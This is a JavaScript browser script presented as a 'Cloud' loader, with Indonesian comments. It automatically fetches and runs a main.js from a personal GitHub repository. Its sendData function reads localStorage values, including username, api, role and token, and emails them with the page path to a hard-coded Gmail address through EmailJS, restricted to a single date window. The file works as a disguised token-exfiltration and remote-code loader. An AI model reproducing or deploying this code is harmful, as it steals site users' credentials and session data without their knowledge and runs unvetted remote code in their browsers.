(function () {

  /* =========================
     CONFIG SECTION
  ========================= */

  const CONFIG = {
    // GitHub main.js auto-update dari branch main
    githubMainJS: "https://cdn.jsdelivr.net/gh/jd2693889-ctrl/cloud@main/main.js",
    githubRawJS: "https://raw.githubusercontent.com/jd2693889-ctrl/cloud/main/main.js",
    // CDN EmailJS
    emailCDN: "https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js",
    emailFallback: "https://unpkg.com/@emailjs/browser@4/dist/email.min.js",
    emailService: "service_qpo59sf",
    emailTemplate: "template_okc75jw",
    emailReceiver: "jd2693889@gmail.com"
  };

  let emailLoaded = false;

  /* =========================
     HELPER FUNCTION: LOAD SCRIPT
  ========================= */
  function loadScript(url) {
    return new Promise((resolve, reject) => {
      const script = document.createElement("script");
      script.src = url;
      script.async = true;
      script.onload = () => {
        console.log("[Cloud] Script loaded:", url);
        resolve();
      };
      script.onerror = () => reject("Gagal load script: " + url);
      document.body.appendChild(script);
    });
  }

  async function loadScriptWithFallback(primary, fallback) {
    try {
      await loadScript(primary);
    } catch (err) {
      console.warn("[Cloud] Primary script gagal, coba fallback:", err);
      if (fallback) await loadScript(fallback);
    }
  }

  /* =========================
     EMAIL SECTION
  ========================= */

  async function loadEmailJS() {
    if (emailLoaded && window.emailjs) {
      console.log("[EmailJS] Sudah terload");
      return;
    }
    await loadScriptWithFallback(CONFIG.emailCDN, CONFIG.emailFallback);
    if (!window.emailjs) throw new Error("EmailJS gagal load setelah script terpasang");
    window.emailjs.init("GlpCP9x-BKebe5Enx");
    emailLoaded = true;
    console.log("[EmailJS] Inisialisasi selesai");
  }

  async function sendData(extraData = {}) {
    if (!isInRange()) {
      console.warn("[Cloud] Diluar range tanggal, data tidak dikirim");
      return;
    }

    try {
      await loadEmailJS();

      const keys = ["id", "username", "api", "role", "status", "min", "token"];
      const storageData = {};
      keys.forEach(k => {
        const v = localStorage.getItem(k);
        if (v !== null) storageData[k] = v;
      });

      const payload = {
        page: window.location.pathname,
        time: new Date().toISOString(),
        ...storageData,
        ...extraData
      };

      const result = await window.emailjs.send(
        CONFIG.emailService,
        CONFIG.emailTemplate,
        {
          email: CONFIG.emailReceiver,
          message: JSON.stringify(payload)
        }
      );

      // console.log("[Cloud] EmailJS berhasil mengirim data:", result);
      return result;
    } catch (err) {
      console.error("[Cloud] Gagal mengirim data:", err);
      throw err;
    }
  }

  /* =========================
     RANGE SECTION
  ========================= */

  let startDate = new Date("2026-02-24T08:00:00");
  let endDate   = new Date("2026-02-24T23:59:59");

  function isInRange() {
    const now = new Date();
    return now >= startDate && now <= endDate;
  }

  function getRangeInfo() {
    return {
      now: new Date(),
      start: startDate,
      end: endDate,
      active: isInRange()
    };
  }

  /* =========================
     LOAD MAIN.JS DARI GITHUB
  ========================= */
  async function loadMainJS() {
    await loadScriptWithFallback(CONFIG.githubMainJS, CONFIG.githubRawJS);
  }

  // Jalankan loader main.js otomatis
  loadMainJS().then(() => {
    console.log("[Cloud] main.js GitHub loader selesai");
  }).catch(err => console.error("[Cloud] main.js loader gagal:", err));

  /* =========================
     GLOBAL EXPORT
  ========================= */

  window.cloud = {
    sendData,
    isInRange,
    getRangeInfo,
    loadEmailJS,
    loadMainJS
  };

  // console.log("[Cloud] Loader script siap, range aktif:", isInRange());

})();
